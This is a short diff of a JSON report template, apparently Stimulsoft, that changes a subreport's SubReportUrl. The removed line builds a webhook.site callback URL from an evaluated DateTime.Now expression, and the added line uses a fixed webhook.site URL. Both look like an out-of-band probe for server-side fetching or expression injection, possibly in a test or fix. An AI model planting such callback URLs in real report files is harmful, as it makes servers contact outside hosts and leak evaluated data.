@@ -14,7 +14,7 @@
         "1": {
           "Ident": "StiSubReport",
           "ClientRectangle": "0,0,40,50",
-          "SubReportUrl": "{\"https://webhook.site/76393f17-a1ad-47f7-be8d-b23f9c8779c1/?t=\" + DateTime.Now.ToString(\"yyyyMMddHHmmss\")}"
+          "SubReportUrl": "https://webhook.site/76393f17-a1ad-47f7-be8d-b23f9c8779c1/?t=as"
         }
       }
     }
